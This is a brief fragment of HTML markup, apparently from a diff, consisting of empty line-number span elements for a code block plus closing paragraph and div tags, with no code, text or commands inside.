+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 
 
 
-</p>
 
         </div>
         
